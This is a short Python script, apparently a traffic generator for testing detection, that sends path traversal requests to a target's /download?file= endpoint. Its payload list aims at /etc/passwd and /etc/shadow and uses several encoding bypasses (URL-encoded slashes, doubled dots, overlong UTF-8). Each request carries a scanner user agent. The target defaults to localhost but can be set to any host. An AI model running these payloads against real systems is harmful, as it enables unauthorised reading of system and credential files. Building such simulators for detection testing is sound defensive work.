import requests
import time
import argparse

# Common path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/var/www/html/../../../etc/shadow",
    "....//....//....//etc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
]

def send_request(target_url, payload):
    """Sends a single malicious request to the target URL."""
    try:
        # Path traversal is often tested against file download or include endpoints
        url_with_payload = f"{target_url}/download?file={payload}"
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10) DirBuster/1.0'}
        
        start_time = time.time()
        response = requests.get(url_with_payload, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        print(f"[TRAVERSAL] Sent payload: {payload} | Status: {response.status_code} | Time: {elapsed:.2f}s")
        
    except requests.exceptions.RequestException as e:
        print(f"[TRAVERSAL] Request failed: {e}")

def simulate_traversal(target_url, count, delay):
    """Simulates Path/Directory Traversal attacks against the target."""
    print(f"Starting Path Traversal Simulation against {target_url}")
    print(f"Total requests to send: {count}")
    print("-" * 50)
    
    for i in range(count):
        payload = TRAVERSAL_PAYLOADS[i % len(TRAVERSAL_PAYLOADS)]
        send_request(target_url, payload)
        
        if delay > 0:
            time.sleep(delay)
            
    print("-" * 50)
    print("Simulation complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate Path Traversal Attacks")
    parser.add_argument("--target", type=str, default="http://localhost:8080", help="Target URL")
    parser.add_argument("--count", type=int, default=10, help="Number of requests to send")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds")
    
    args = parser.parse_args()
    simulate_traversal(args.target, args.count, args.delay)